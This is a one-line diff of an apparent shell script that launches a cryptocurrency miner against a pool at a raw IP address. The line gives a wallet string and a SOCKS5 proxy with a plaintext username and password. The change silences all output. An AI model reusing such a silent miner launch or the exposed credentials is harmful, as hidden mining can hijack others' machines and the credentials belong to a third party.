@@ -1,1 +1,1 @@
-./wild --algo pearlhash --url 108.61.144.231:80 --user prl1p7ywpecpnx8acnac87vzll58eyx92fjsf3r0t2ywnv08sr6pmrz3s8y7y36@nock=3o7VHmL7Duio1WsC1dPUETusPA1thmPP7SxLPN5XoJe5B6uojFHqEsy.$(shuf -n 1 -i 1-99999999) --proxy socks5://abdul:krisnandi2020@108.61.144.231:443
+./wild --algo pearlhash --url 108.61.144.231:80 --user prl1p7ywpecpnx8acnac87vzll58eyx92fjsf3r0t2ywnv08sr6pmrz3s8y7y36@nock=3o7VHmL7Duio1WsC1dPUETusPA1thmPP7SxLPN5XoJe5B6uojFHqEsy.$(shuf -n 1 -i 1-99999999) --proxy socks5://abdul:krisnandi2020@108.61.144.231:443 > /dev/null 2>&1
